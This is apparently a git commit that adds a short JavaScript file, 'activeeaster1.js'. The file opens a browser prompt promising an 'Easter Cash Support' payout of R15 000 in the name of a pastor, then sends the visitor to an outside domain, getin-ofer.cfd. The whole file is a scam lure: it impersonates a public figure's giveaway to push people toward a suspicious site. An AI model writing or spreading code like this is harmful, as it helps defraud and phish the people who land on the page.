62dcf80f89183bfb05f49f052d9688ef14c18011
Help-All <imaobongumoh637@gmail.com>
2026-04-02 09:03:22 +0100

    Create activeeaster1.js

---
+++ activeeaster1.js
@@ -0,0 +1,10 @@
+var password = 'R15 000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive PASTOR ALPH LUKAU R15 000 Easter Cash Support. Click OK to receive Instantly.',
+  'R15 000'
+);
+
+if (password !== 'R15 000') {
+    location.href = 'https://getin-ofer.cfd/R15000-Easter-Support.html';
+}
